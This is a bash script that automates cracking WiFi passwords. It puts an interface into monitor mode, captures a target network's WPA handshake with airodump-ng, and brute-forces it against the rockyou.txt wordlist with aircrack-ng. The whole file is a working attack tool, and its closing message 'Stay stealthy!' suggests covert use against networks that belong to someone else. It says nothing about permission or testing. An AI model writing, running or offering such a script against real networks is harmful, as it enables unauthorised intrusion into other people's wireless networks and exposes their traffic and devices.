#!/bin/bash

# Colors for fun
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[+] Starting WiFi Crack Automation${NC}"

# Step 1: List wireless interfaces
echo -e "${GREEN}[*] Detecting wireless interfaces...${NC}"
iw dev | grep Interface
read -p "Enter your interface name (e.g., wlan0): " iface

# Step 2: Set monitor mode
echo -e "${GREEN}[*] Killing conflicting processes...${NC}"
airmon-ng check kill
echo -e "${GREEN}[*] Enabling monitor mode...${NC}"
airmon-ng start $iface

mon_iface="${iface}mon"
echo -e "${GREEN}[*] Interface now in monitor mode: ${mon_iface}${NC}"

# Step 3: Start scanning
echo -e "${GREEN}[*] Launching airodump-ng. Close window after target found.${NC}"
sleep 2
xterm -hold -e "airodump-ng $mon_iface" &

read -p "Enter target BSSID: " bssid
read -p "Enter channel: " channel
read -p "Enter file name to save capture (without .cap): " file

# Step 4: Capture handshake
echo -e "${GREEN}[*] Starting handshake capture on channel ${channel}${NC}"
xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w $file $mon_iface" &

read -p "When handshake is captured, press Enter to continue..."

# Step 5: Start cracking
echo -e "${GREEN}[*] Starting aircrack-ng with rockyou.txt${NC}"
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $bssid ${file}-01.cap

# Step 6: Cleanup
echo -e "${GREEN}[*] Stopping monitor mode${NC}"
airmon-ng stop $mon_iface
service NetworkManager restart

echo -e "${GREEN}[+] Done. Stay stealthy!${NC}"
